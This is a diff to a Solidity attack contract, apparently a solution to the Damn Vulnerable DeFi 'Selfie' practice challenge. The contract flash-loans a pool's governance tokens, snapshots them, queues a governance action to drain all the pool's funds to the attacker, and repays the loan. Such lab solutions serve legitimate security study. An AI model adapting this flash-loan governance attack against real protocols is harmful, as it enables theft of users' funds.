@@ -1,13 +1,14 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.17;
+pragma solidity ^0.8.0;
 
-import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
-import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";
-import {Address} from "openzeppelin-contracts/utils/Address.sol";
+import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import {ERC20Snapshot} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 import {SimpleGovernance} from "./SimpleGovernance.sol";
 import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
 import {SelfiePool} from "./SelfiePool.sol";
 import "forge-std/Test.sol";
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SimpleGovernanceAttack is Test {
     using Address for address;
@@ -21,22 +22,28 @@ contract SimpleGovernanceAttack is Test {
     constructor(address _governance, address _selfiePool) {
         governance = SimpleGovernance(_governance);
         selfiePool = SelfiePool(_selfiePool);
-        governanceToken = governance.governanceToken();
+        governanceToken = DamnValuableTokenSnapshot(governance.getGovernanceToken());
         attacker = msg.sender;
     }
 
     function attack() public {
-        //  1. Flash loan all DVT from selfiePool
-        selfiePool.flashLoan(governanceToken.balanceOf(address(selfiePool)));
+        selfiePool.flashLoan({
+            _receiver: IERC3156FlashBorrower(address(this)),
+            _token: address(governanceToken),
+            _amount: governanceToken.balanceOf(address(selfiePool)),
+            _data: abi.encodeWithSignature("receiveTokens(address,uint256)", address(governanceToken), governanceToken.balanceOf(address(selfiePool)))
+        });
     }
 
     function receiveTokens(address _token, uint256 _amount) public {
         // 2. Create token snapshot
         governanceToken.snapshot();
         // 3. Queue a governance action to drain all DVT from selfiePool
-        actionId = governance.queueAction(
-            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", address(attacker)), 0
-        );
+        actionId = governance.queueAction({
+            target: address(selfiePool),
+            value: 0,
+            data: abi.encodeWithSignature("drainAllFunds(address)", address(attacker))
+        });
         // 4. Return the flash loan
         DamnValuableTokenSnapshot(_token).transfer(address(selfiePool), _amount);
     }
